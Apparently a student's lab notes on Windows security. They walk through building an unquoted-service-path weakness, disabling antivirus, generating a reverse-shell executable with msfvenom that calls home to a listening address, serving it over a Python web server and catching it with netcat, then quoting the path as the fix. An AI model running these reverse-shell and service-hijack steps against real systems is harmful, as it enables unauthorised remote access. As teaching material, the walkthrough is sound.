#### Assignment 1 


Here is a list of things to accomplish for Assignment 1 :


1. SetExecutionPolicy RemoteSigned
2. Remove TLS 1.0 
3. Remove 3DES
4. Add plenty of Pseudocode!
5. Use **Powershell** in order to write the *two* scripts


The report is a **Step-by-Step Walkthrough** to an audience that has a background in IT in general!

# Services 




When you have a server, it would be nice to have RDP set up. You would have to install third-party services. and they are not all coded very well, with a lack of security at times.



if you type : 


		services


We would see a large number of services. He has a Razer service to control his devices. If you click on **Properties**, you would see where the .exe file is. 




We will also make our own vulnerable service. After disabling the Anti-virus, we will make a service with a *path lacking the quotes*




		sc create "Vulnerable Service" binpath= "C:\Program Files\service\binary files\real-program.exe" Displayname= "Vuln Service" start= auto




If we do not have the quotes, the command will iterate through each portion of the folder name, running every file before running the intended service. 



The attack is called a **Service Jacking**. 




We will run *msfvenom*, which will generate a reverse-shell for our intended target, which will call home to us. The firewalls wont block outgoing traffic. 


*msfvenom* is a part of **Metasploit** : 


		msfveqom -p windows/shell_reverse_tcp lhost=10.0.0.244 lport=2323 -f exe > binary.exe



So he would recommend running a *Python-based* Web Server on Kali Linux, so we can host the file. 

		python3 -m http.server 8080


After getting the file to the folder where the service is, we would type the following *netcat* command : 


		nc -lvnp 2323





#### How would we fix it ? 



We would issue the following command to fix this malicious service : 


		sc config "Vulnerable Service" binpath="\"C:\Program Files\service\binary files\real-program.exe\""
